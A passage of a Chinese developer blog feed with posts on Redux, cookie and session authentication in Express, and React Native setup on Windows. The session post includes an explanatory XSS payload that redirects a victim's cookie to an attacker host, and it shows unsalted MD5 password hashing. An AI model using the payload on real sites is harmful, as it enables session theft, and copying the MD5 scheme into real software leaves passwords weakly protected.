lastUpdated &amp;&amp; </span><br><span class="line">                        &lt;span&gt;</span><br><span class="line">                            最后更新时间:&#123;<span class="keyword">new</span> <span class="built_in">Date</span>(lastUpdated).toLocaleTimeString()&#125;</span><br><span class="line">                        &lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">                    &#125;</span></span><br><span class="line"><span class="regexp">                    &#123;</span></span><br><span class="line"><span class="regexp">                        !isFetching &amp;&amp; </span></span><br><span class="line"><span class="regexp">                        &lt;a href="javascript:;" onClick=&#123;this.handleRefreshClick.bind(this)&#125;&gt;刷新</span></span><br><span class="line"><span class="regexp">                        &lt;/</span>a&gt;</span><br><span class="line">                    &#125;</span><br><span class="line">                &lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">                &#123;</span></span><br><span class="line"><span class="regexp">                    isEmpty? (isFetching?&lt;h3&gt;正在加载当中...&lt;/</span>h3&gt;:&lt;h3&gt;没有相关文章&lt;/h3&gt;)</span><br><span class="line">                            :&lt;div style=&#123;&#123;backgroundColor:isFetching?0.5:1&#125;&#125;&gt;</span><br><span class="line">                                &lt;Posts posts=&#123;posts&#125;/&gt;&lt;/div&gt;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mapStateToProps = <span class="function"><span class="params">state</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;selectReddit,postsByReddit&#125; = state;</span><br><span class="line">    <span class="keyword">const</span> &#123;isFetching,lastUpdated,<span class="attr">items</span>:posts=[]&#125; = postsByReddit[selectReddit] ||</span><br><span class="line">            &#123;</span><br><span class="line">                isFetching:<span class="literal">true</span>,</span><br><span class="line">                items: []</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        selectReddit,</span><br><span class="line">        isFetching,</span><br><span class="line">        lastUpdated,</span><br><span class="line">        posts</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> connect(mapStateToProps)(App);</span><br></pre></td></tr></table></figure><p>可见我们将App与Redux进行了连接，通过connect方法,我们知道，当组件与redux连接时，我们就能获得dispatch和store,而mapStateToProps正是根据获得的state生成了App需要用到的props，这样我们的state就与组件联系在一起了。</p><h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><p>可见，redux的数据管理方案相对于之前的组件单独管理自己的state确实是清晰了不少，但是要求我们的学习成本也更高了，我们需要有一定的函数式编程思想，我们还得自己去设计组件的层次。这种数据管理方式，对于复杂应用确实比较适合，但是当我们的应用足够简单的时候，使用redux是否是画蛇添足，反而使得问题复杂化了。具体的应用场景还得在实践当中去感悟。。。</p><p>因为最近项目的需要，其复杂程度也足够需要使用类似于redux的数据管理模式，还有一些问题没有很好的解决，如react父路由与子路由的数据传输。之前的vue可以直接通过router-view那种类似于父子组件的props传递方式进行数据传递，但react貌似没这种处理方式，所以就在想除了各个router都与redux相连的处理方式，还有什么办法，等着解决。</p><p><strong>国庆节假期即将结束，紧张又充实的生活又将开启</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;也许你也感受到web世界的变化，web客户端从简单的展示性页面向着越来越复杂的web应用转化。而在前后端分离下的开发模式下，客户端数据逻辑变得纷繁复杂，难以维护。React设计理念之一为单向数据流，这从一方面方便了数据的管理。但是React本身只是view，并没有提供完备的数据管理方案。应由而生的其周边类库，诸如ImmutableJS不变数据解决方案，flux作为state管理方案。而redux即为类似于flux的数据解决方案。虽然文章分类于react，但是并不代表redux就与react有着必然的联系。其作为独立的库，适用于多个应由框架甚至是原生JavaScript。&lt;/p&gt;
&lt;p&gt;类似于Redux的，有为Vue设计的Vuex。Redux/Vuex的数据管理方案，深深地透露出函数式编程(FP)的思想。对于习惯了面向对象(OO)思想的我们来说，函数式编程也是一大挑战。所以本人也打算对函数式编程的一些主要概率进行总结，作为单独的一篇文章。&lt;br&gt;&lt;img src=&quot;http://7xsi10.com1.z0.glb.clouddn.com/redux-flow.jpeg&quot; alt=&quot;原理图&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;国庆节还在写代码的，一定是单身狗&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="React" scheme="http://luoxia.me/code/categories/React/"/>
    
    
      <category term="Redux" scheme="http://luoxia.me/code/tags/Redux/"/>
    
      <category term="React" scheme="http://luoxia.me/code/tags/React/"/>
    
  </entry>
  
  <entry>
    <title>session身份验证</title>
    <link href="http://luoxia.me/code/2016/09/24/session%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/"/>
    <id>http://luoxia.me/code/2016/09/24/session身份验证/</id>
    <published>2016-09-24T05:14:12.000Z</published>
    <updated>2017-11-16T13:10:06.489Z</updated>
    
    <content type="html"><![CDATA[<p>我们需要验证程序的使用者身份，需要一定的技术手段。由于http是一种无状态的协议，所以就需要额外的解决方案。最早的解决方案是Cookie,然而Cookie本身有一定限制，无论储存容量还是安全性考虑，都需要其他技术来配合进行身份的识别。</p><p>Session就是解决这个问题，其数据储存在服务器，更加安全，其一般通过cookie来与客户端建立联系,这其中又会涉及到一些安全问题，性能问题等等。这篇文章就来简单的总结一下自己在实践学习当中的理解吧。。。</p><p><strong>文章目录</strong></p><ol><li>Cookie</li><li>Session与Cookie</li><li>express当中的express-session</li><li>Session安全</li><li>实例项目分析<a id="more"></a></li></ol><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>HTTP Cookie,用于在客户端储存会话信息。对于特定域名，cookie的形成步骤：</p><p><strong>1.</strong> 首次访问时，服务端设置响应头:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:name=value; expires=Mon, 22-Jan-07 07:10:24 GMT; domain=.wrox.com; path=/; secure</span><br></pre></td></tr></table></figure></p><p>其中设置了secure标志表示只在HTTPS有效，通过SSL连接才能传输</p><p><strong>2.</strong> 以后每次对worx.com的子域名和worx.com进行访问，HTTP请求头都会带上name=value这个cookie名值对儿。</p><h4 id="cookie的问题"><a href="#cookie的问题" class="headerlink" title="cookie的问题"></a>cookie的问题</h4><ol><li><p>一旦创建，每次请求都会带上cookie，当cookie过大时，会造成请求头过大，造成带宽浪费</p></li><li><p>有很多请求，cookie是不必要的，例如静态资源服务。<br>解决办法是对静态资源用一个专门的域名</p></li><li><p>cookie是可以通过客户端JS更改的，如果完全靠cookie来做身份验证，非常不安全。例如对于是否是vip的isVIP字段，伪造cookie设定其为true,就能轻松获得vip权限。</p></li></ol><h3 id="Session与Cookie"><a href="#Session与Cookie" class="headerlink" title="Session与Cookie"></a>Session与Cookie</h3><p>与Cookie不同的是，Session会话状态是储存在服务端的，客户端无法修改。</p><p>Session与Cookie实现服务端与客户端的一一对应:</p><p><strong>1.</strong> 首次发起请求，服务端检测到请求头中没有带session的口令，生成一个唯一值，并且设定超时时间,以《深入浅出Node.js》的代码为例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sessions = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> key = <span class="string">'session_id'</span>;</span><br><span class="line"><span class="keyword">var</span> EXPIRES = <span class="number">20</span>*<span class="number">60</span>*<span class="number">1000</span><span class="comment">//20分钟</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> generate = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> session = &#123;&#125;;</span><br><span class="line">    session.id = (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime() + <span class="built_in">Math</span>.random();</span><br><span class="line">    session.cookie = &#123;</span><br><span class="line">        expire:(<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime() + EXPIRES</span><br><span class="line">    &#125;;</span><br><span class="line">    sessions[session.id] = session;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.</strong> 首次访问，没有发现相应口令，生成，非首次访问，检测口令是否正确以及口令对应的session是否过期，如果没有过期，就更新过期时间，过期了就删掉原来的session,重新生成session<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> id = req.cookies[key];<span class="comment">//获取请求头中的cookie相应的口令</span></span><br><span class="line">    <span class="keyword">if</span>(!id)&#123;</span><br><span class="line">        req.session = generate();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> session = sessions[id];</span><br><span class="line">        <span class="keyword">if</span>(session)&#123;</span><br><span class="line">            <span class="keyword">if</span>(session.cookie.expire &gt; (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime())&#123;</span><br><span class="line">                <span class="comment">//更新超时时间</span></span><br><span class="line">                session.cookie.expire = (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime() + EXPIRES;</span><br><span class="line">                req.session = session;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//超时，删除旧数据,重新生成</span></span><br><span class="line">            <span class="keyword">delete</span> sessions[id];</span><br><span class="line">            req.session = generate();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//session过期或者口令不对,重新生成session</span></span><br><span class="line">        req.session = generate();</span><br><span class="line">    &#125;</span><br><span class="line">    handle(req,res);<span class="comment">//其他处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当session过期或者口令不对时，除了重新生成session以外，还得重新设置cookie,通过Set-Cookie响应头来更新cookie</p><h4 id="关于session与cookie的生命周期"><a href="#关于session与cookie的生命周期" class="headerlink" title="关于session与cookie的生命周期"></a>关于session与cookie的生命周期</h4><ol><li><p>根据上述原理，假设Session设置的EXPIRES为20分钟，那么当客户端超过20分钟以上没有再次向这个域名发起请求，那么session就会过期，并重新生成session和更新cookie值;</p></li><li><p>对于cookie,通过设置Expres(UTC格式的时间字符串)表示何时过期，而设置Max-Age表示多久后过期。</p></li></ol><h3 id="express当中的express-session"><a href="#express当中的express-session" class="headerlink" title="express当中的express-session"></a>express当中的express-session</h3><p>express-session模块通过设置对象生成一个中间件，直接app.use就能够实现上述session实现原理的功能:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'express-session'</span>);</span><br><span class="line"><span class="keyword">const</span> MongoStore = <span class="built_in">require</span>(<span class="string">'connect-mongo'</span>)(session);</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">  secret:settings.cookieSecret,</span><br><span class="line">  key:settings.db,</span><br><span class="line">  cookie:&#123;</span><br><span class="line">    maxAge:<span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span></span><br><span class="line">  &#125;,</span><br><span class="line">  store:<span class="keyword">new</span> MongoStore(&#123;</span><br><span class="line">    db:settings.db,</span><br><span class="line">    host:settings.host,</span><br><span class="line">    port:settings.port</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><p>上述传入session()的对象即为设置对象，secret为必须项，这个是用于生成私钥（关于session安全,后面详细讲述);<br>key为设置cookie的口令键值对儿的键名，cookie设置cookie项,默认为<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">path</span>: <span class="string">'/'</span>, <span class="attr">httpOnly</span>: <span class="literal">true</span>, <span class="attr">secure</span>: <span class="literal">false</span>, <span class="attr">maxAge</span>: <span class="literal">null</span> &#125;</span><br></pre></td></tr></table></figure></p><p><strong>store</strong><br>用于存放session的容器，可以存在内存当中例如直接存在一个sessions数组，也可以存在硬盘中，如数据库。</p><p>这里存放在mongodb数据库中，host和port是mongodb数据库服务监听地址。</p><p>这样，使用了这个中间件，就可以通过req.session访问store里的JSON化session对象了，还可以在上面进行扩展，如一个用户登录后，在该session_id对应的session上添加user，就能做到登录的状态验证了。</p><p><strong>session的生命周期</strong></p><p><strong>1.</strong>当session存在于内存当中时:</p><p>maxAge项既会设置cookie的Expries为当前服务器时间+maxAge项，也会设置session的生命时间,默认为null,即浏览器关闭后session消失<br><strong>2.</strong>当存在于数据库当中时:</p><p>maxAge项既会设置cookie的Expries为当前服务器时间+maxAge项，也会设置session的生命时间,不同的是，就算浏览器关闭，只要session过期时间没到，session也不会过期。另外，由于connect-mongo特殊性，采用一分钟左右查询session更新的机制，所以可能时间会有偏差</p><p>对于访问同一个数据库服务的不同浏览器，由于cookie为不同厂商实现，所以同样会产生不同的session</p><p>以下是客户端第一次访问express应用服务端生成的session(保存在mongodb中):<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/session_02.png" alt="session_01"><br>以下是客户端得到的Set-Cookie响应头以及生成的cookie关于session的口令:<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/session_03.png" alt="session_02"></p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/session_01.png" alt="session_03"></p><p>可以看到，服务端的session_id值和客户端cookie值的blog值有不同的地方，blog值分为两部分，前者与数据库中的session_id差不多，但是后面是啥？这就是上面提到过的一个与secret有关的东西，是为了增加安全度而设置的私钥经过编码后生成的。详细见下文的session安全。</p><h3 id="session安全"><a href="#session安全" class="headerlink" title="session安全"></a>session安全</h3><p>做人做事，安全第一。是的，开发的应用也是如此。而对于身份验证这一环节，安全问题也是一个挑战。如果安全性不好，攻击者随意伪造身份，来获取高权限，从而危及网站，应用安全。</p><h4 id="密码加密"><a href="#密码加密" class="headerlink" title="密码加密"></a>密码加密</h4><p>node利用 OpenSSL库来实现它的加密技术，这是因为OpenSSL已经是一个广泛被采用的加密算法。它包括了类似MD5 or SHA-1 算法，这些算法你可以利用在你的应用中。</p><p>node有一个模块叫crypto,可以进行加密操作。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = req.body.name;</span><br><span class="line">    <span class="keyword">var</span> password = req.body.password;</span><br><span class="line">    <span class="keyword">var</span> md5 = crypto.createHash(<span class="string">'md5'</span>);</span><br><span class="line">    password = md5.update(password).digest(<span class="string">'hex'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> newUser = <span class="keyword">new</span> User(&#123;</span><br><span class="line">        name:name,</span><br><span class="line">        password:password</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></p><p>crypto.createHash通过指定的算法来创建一个hash实例，然后update()方法其实是将字符串拼接，可以多次调用，最终通过diges()方法生成最终字符串，这里hex通过16进制表示。</p><h4 id="将session口令通过私钥加密进行签名，提高伪造成本"><a href="#将session口令通过私钥加密进行签名，提高伪造成本" class="headerlink" title="将session口令通过私钥加密进行签名，提高伪造成本"></a>将session口令通过私钥加密进行签名，提高伪造成本</h4><p>虽然session保存在服务端不能被客户端更改，但是客户端的cookie的session_id可能被随机命中而伪造成功。可以用通过私钥进行签名。如：</p><p>加密签名:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sign = <span class="function"><span class="keyword">function</span>(<span class="params">val,secret</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> val + <span class="string">'.'</span> + crypto</span><br><span class="line">        .createHmac(<span class="string">'sha256'</span>,secret)</span><br><span class="line">        .update(val)</span><br><span class="line">        .digest(<span class="string">'base64'</span>)</span><br><span class="line">        .replace(<span class="regexp">/\=+$/</span>,secret);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>请求时，通过secret解密:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> unsign = <span class="function"><span class="keyword">function</span>(<span class="params">val,secret</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> str = val.slice(<span class="number">0</span>,val.lastIndexOf(<span class="string">'.'</span>));</span><br><span class="line">    <span class="keyword">return</span> sign(str,secret) == val?str:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>HMAC全名是 keyed-Hash Message Authentication Code，中文直译就是密钥相关的哈希运算消息认证码，HMAC运算利用哈希算法，以一个密钥和一个消息为输入，生成一个加密串作为输出。HMAC可以有效防止一些类似md5的彩虹表等攻击，比如一些常见的密码直接MD5存入数据库的，可能被反向破解。<br>crypto.createHmac(algorithm, key)<br>这个方法返回和createHash一样，返回一个HMAC的实例，有update和digest方法。</li></ul><h4 id="cookie被盗用，如XSS漏洞"><a href="#cookie被盗用，如XSS漏洞" class="headerlink" title="cookie被盗用，如XSS漏洞"></a>cookie被盗用，如XSS漏洞</h4><p>如果cookie被盗用，攻击者就能拿到session_id，就大势已去了。cookie被盗用有许多场景。xss比较典型。</p><p>关于xss的话题，比较大，涉及web前端安全领域，小小的例子:</p><p>原网站a.com代码里有这样一句:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'#box'</span>).html(location.hash.replace(<span class="string">'#'</span>,<span class="string">''</span>));</span><br></pre></td></tr></table></figure><p>可见这句会将url的hash值作为box容器的html内容，攻击者可以将js脚本加在后面:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.com/path#&lt;script&gt;location.href = 'http://c.com/?'+document.cookie&lt;/script&gt;;</span><br></pre></td></tr></table></figure></p><p>这样后面的脚本就会执行了，当用户访问攻击者给的这个url时，用户会带着在a.com的cookie去访问c.com，这样攻击者就获得了用户在a.com的cookie了。</p><p>所以当我们直接在html插入html代码时，一定要注意将一些特殊字符进行转义。对于xss的防范措施，详情可以通过其他资料进行了解。</p><h3 id="实例项目分析"><a href="#实例项目分析" class="headerlink" title="实例项目分析"></a>实例项目分析</h3><p>最近写的一个基于vue+express+mongodb的论坛单页面应用。</p><h4 id="构思"><a href="#构思" class="headerlink" title="构思:"></a>构思:</h4><ol><li><p>vue首页加载App.vue为根路由，其下有四个子路由:’/Home’,’/Log’,’/Post’,’/Reg’;分别对应首页，登录，发表，注册。</p></li><li><p>vue首页通过node渲染，传递req.session.user对象表示用户身份，挂载在window对象，vue根据user是否存在来渲染首页，将所有文章挂载在window.posts，vue渲染。</p></li><li><p>其余所有页面在vue路由间跳转，通过node提供的api异步发起请求。</p></li><li><p>session,user,posts都存在mongodb当中。</p></li></ol><h3 id="结语"><a href="#结语" class="headerlink" title="结语:"></a>结语:</h3><p>身份验证在应用当中非常普遍，session相对于纯cookie形式来说比较安全，但是也存在一些不足，node去管理session消耗的时间资源，以及cookie被盗用的风险都使得session不够完美。</p><p>下一篇会介绍另外一种目前比较常用的验证方式:Token验证。</p><p>前后端分离下的Token验证方式</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们需要验证程序的使用者身份，需要一定的技术手段。由于http是一种无状态的协议，所以就需要额外的解决方案。最早的解决方案是Cookie,然而Cookie本身有一定限制，无论储存容量还是安全性考虑，都需要其他技术来配合进行身份的识别。&lt;/p&gt;
&lt;p&gt;Session就是解决这个问题，其数据储存在服务器，更加安全，其一般通过cookie来与客户端建立联系,这其中又会涉及到一些安全问题，性能问题等等。这篇文章就来简单的总结一下自己在实践学习当中的理解吧。。。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;文章目录&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Cookie&lt;/li&gt;
&lt;li&gt;Session与Cookie&lt;/li&gt;
&lt;li&gt;express当中的express-session&lt;/li&gt;
&lt;li&gt;Session安全&lt;/li&gt;
&lt;li&gt;实例项目分析
    
    </summary>
    
      <category term="Nodejs" scheme="http://luoxia.me/code/categories/Nodejs/"/>
    
    
      <category term="nodeJS" scheme="http://luoxia.me/code/tags/nodeJS/"/>
    
      <category term="session" scheme="http://luoxia.me/code/tags/session/"/>
    
      <category term="express" scheme="http://luoxia.me/code/tags/express/"/>
    
  </entry>
  
  <entry>
    <title>Windows下React Native安卓环境踩坑记</title>
    <link href="http://luoxia.me/code/2016/09/06/Windows%E4%B8%8BReact%20Native%E5%AE%89%E5%8D%93%E7%8E%AF%E5%A2%83%E8%B8%A9%E5%9D%91%E8%AE%B0/"/>
    <id>http://luoxia.me/code/2016/09/06/Windows下React Native安卓环境踩坑记/</id>
    <published>2016-09-06T04:23:46.000Z</published>
    <updated>2017-11-16T13:10:06.486Z</updated>
    
    <content type="html"><![CDATA[<p>React Native是FaceBook开源的一款用于开发移动app的框架，不用java开发安卓，不用object-c或swift开发IOS，而是用一套JS（ReactJS）。”LEARN ONCE, WRITE ANYWHERE: BUILD MOBILE APPS WITH REACT”.</p><p>最近折腾折腾用windows来进行react-native开发安卓，毕竟windows，各种坑，搞了好几个小时，功夫不负有心人，最终成功的迎来了Hello,React Native!值得写一篇文章记录记录了。</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/successyeah.png" alt="真机测试成功"></p><p>有钱了一定要买Mac!!</p><p>前几天的NingJS大会上，尤大大宣布Vue和阿里的weex团队合作，目的是让大家可以用vue来开发原生app。虽然还有很长的路要走。。期待国内技术的未来。<br><a id="more"></a></p><p><strong>具体的配置过程react native文档还是写得比较详细的，文章只是记录我遇到的一些问题，通过各种渠道，最终解决完成，感谢社区的各位前辈的热心帮助</strong></p><h3 id="虚拟机运行安卓模拟器问题"><a href="#虚拟机运行安卓模拟器问题" class="headerlink" title="虚拟机运行安卓模拟器问题"></a>虚拟机运行安卓模拟器问题</h3><p><strong>问题描述</strong><br>在windows上我使用Genymotion安卓模拟器来开发，从virtualBox虚拟机启动，提示报错如下:<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/qs01.jpg" alt="运行模拟器出错"></p><p>查了查错误，原来是我的系统默认就是破解了主题的，就是uxtheme.dll有关主题的文件出的问题。</p><p><strong>解决办法</strong><br>使用主题破解/恢复软件来恢复主题破解，当自己本地没有原厂的主题文件备份时，需要下载原始文件,找到包含了原始文件备份的UniversalThemePatcher软件，<a href="http://pan.baidu.com/s/1hqpOljY" target="_blank" rel="noopener">百度云地址:</a> 提取密码:4p51，解压里面有32位和64位不同的原始文件备份，将里面的三个原始备份.backup文件复制到c:\windows\system32下面,再运行UniversalThemePatcher,就可以恢复了，恢复后的结果：<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/slove01.png" alt="恢复主题破解"><br>这样，安卓模拟器就运行了。</p><h3 id="模拟器运行应用一片空白，红框报错"><a href="#模拟器运行应用一片空白，红框报错" class="headerlink" title="模拟器运行应用一片空白，红框报错:"></a>模拟器运行应用一片空白，红框报错:</h3><p><strong>问题描述</strong><br>react-native run-android，apk也是安装了的，packages也是运行中的，没有什么报错，可运行apk就是一片空白加一红框报错。貌似很多人都遇到了这个问题。不过在我的捣鼓和大家的热心帮助下，还是解决了。</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/qs02.png" alt="packages红框"></p><p>网上看了各种问题解决办法，都尝试过，但是并没有什么卵用。于是我就先试试真机。</p><p><strong>解决办法</strong><br>见真机测试部分</p><h3 id="真机测试"><a href="#真机测试" class="headerlink" title="真机测试"></a>真机测试</h3><p>我的安卓机是5.1.1的，打开usb调试，连接电脑，连接电脑的wifi,理论上是没什么问题的</p><p>执行adb devices，正常:</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/device01.png" alt="查询设备"></p><p><strong>问题:</strong><br>执行react-native run-android报错:</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/qs03.png" alt="安装apk出错"></p><p>提示没法安装apk到手机。。。</p><p><strong>解决办法:</strong><br>原来是项目的gradle版本问题，依赖了一个bug比较多的版本，需要改成一个比较稳定的版本如1.2.3。<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/solve02.png" alt="gradle"></p><p>重新run-android，成功的安装了app，但是打开apk，又一次遇到了上面模拟器的红框错误。</p><p>官网教程说的安卓5.0以上是不用配置ip和端口的，但是我最终还是设置了Ip和端口才解决了上面的问题。</p><p>吃了个午饭回来</p><p>dev settings&gt;debug server host&amp; port for device，然后reload。。。当当当当，神奇的成功了:</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/suc001.png" alt="真机测试成功"></p><p>我之前设置ip也不行啊。。。不知道是不是它也饿了。。。</p><p>然后再回来看看我的模拟器，这下也行了：</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/suc002.png" alt="模拟器运行成功"></p><p>应该就是上面的gradle版本问题。</p><p><strong>结语</strong><br>真是各种问题，各种坑。但终究还是解决了。模拟器找不到错误解决方案，干脆就用真机先试试，正是真机测试找到了解决办法，模拟器的也一并解决了。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;React Native是FaceBook开源的一款用于开发移动app的框架，不用java开发安卓，不用object-c或swift开发IOS，而是用一套JS（ReactJS）。”LEARN ONCE, WRITE ANYWHERE: BUILD MOBILE APPS WITH REACT”.&lt;/p&gt;
&lt;p&gt;最近折腾折腾用windows来进行react-native开发安卓，毕竟windows，各种坑，搞了好几个小时，功夫不负有心人，最终成功的迎来了Hello,React Native!值得写一篇文章记录记录了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xsi10.com1.z0.glb.clouddn.com/successyeah.png&quot; alt=&quot;真机测试成功&quot;&gt;&lt;/p&gt;
&lt;p&gt;有钱了一定要买Mac!!&lt;/p&gt;
&lt;p&gt;前几天的NingJS大会上，尤大大宣布Vue和阿里的weex团队合作，目的是让大家可以用vue来开发原生app。虽然还有很长的路要走。。期待国内技术的未来。&lt;br&gt;
    
    </summary>
    
      <category term="React Native" scheme="http://luoxia.me/code/categories/React-Native/"/>
    
    
      <category term="React" scheme="http://luoxia.me/code/tags/React/"/>
    
      <category term="React Native" scheme="http://luoxia.me/code/tags/React-Native/"/>
    
      <category term="安卓开发" scheme="http://luoxia.me/code/tags/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>以一个WebApp开始探寻Vue的思想</title>
    <link href="http://luoxia.me/code/2016/09/01/%E4%BB%A5%E4%B8%80%E4%B8%AAWebApp%E5%BC%80%E5%A7%8B%E6%8E%A2%E5%AF%BBVue%E7%9A%84%E6%80%9D%E6%83%B3/"/>
    <id>http://luoxia.me/code/2016/09/01/以一个WebApp开始探寻Vue的思想/</id>
    <published>2016-09-01T15:19:25.000Z</published>
    <updated>2017-11-16T13:10:06.490Z</updated>
    
